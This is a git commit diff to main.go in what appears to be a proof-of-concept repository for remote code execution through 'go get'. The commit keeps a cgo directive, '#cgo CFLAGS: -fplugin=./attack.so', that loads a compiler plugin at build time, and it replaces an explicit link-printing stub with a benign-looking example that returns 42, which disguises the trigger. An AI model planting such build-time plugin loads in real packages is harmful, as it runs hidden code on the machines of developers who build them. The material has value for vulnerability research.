f8c1bb9c2d8e194ee2f4dea787443dae0eb2fbd1
ticarpiPOC <40183335+ticarpiPOC@users.noreply.github.com>
2018-06-11 21:53:33 +0100

    Update main.go

--- main.go
+++ main.go
@@ -1,14 +1,22 @@
 package main
-
-/*
-#cgo CFLAGS: -fplugin=./attack.so
-void echo() {
-  printf("link: https://github.com/ticarpiPOC/go-get-rce-poc/");
-}
-*/
+// #cgo CFLAGS: -fplugin=./attack.so
+// typedef int (*intFunc) ();
+//
+// int
+// bridge_int_func(intFunc f)
+// {
+//      return f();
+// }
+//
+// int fortytwo()
+// {
+//      return 42;
+// }
 import "C"
+import "fmt"
 
 func main() {
-	C.echo()
-	return
+    f := C.intFunc(C.fortytwo)
+    fmt.Println(int(C.bridge_int_func(f)))
+    // Output: 42
 }
